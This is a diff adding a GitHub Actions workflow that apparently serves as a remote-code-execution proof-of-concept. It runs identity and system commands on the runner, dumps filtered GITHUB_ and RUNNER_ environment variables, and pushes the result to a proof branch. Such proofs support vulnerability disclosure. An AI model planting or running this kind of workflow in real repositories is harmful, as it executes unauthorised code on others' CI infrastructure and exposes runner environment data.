@@ -1,0 +1,23 @@
+name: rce-proof
+on: [push]
+permissions:
+  contents: write
+jobs:
+  proof:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute arbitrary commands
+        run: |
+          { echo "== CODE EXECUTION PROOF (GitHub Actions runner) ==";
+            id; whoami; hostname; uname -a; pwd; date;
+            echo "== runner env (filtered) ==";
+            env | grep -iE "GITHUB_|RUNNER_|CI=" | sort | head -40;
+          } > rce_proof.txt
+      - name: Commit proof back
+        run: |
+          git config user.email "poc@example.com"
+          git config user.name "poc"
+          git add rce_proof.txt
+          git commit -m "rce proof [skip ci] (no-op)" || true
+          git push origin poc-rce-proof || true
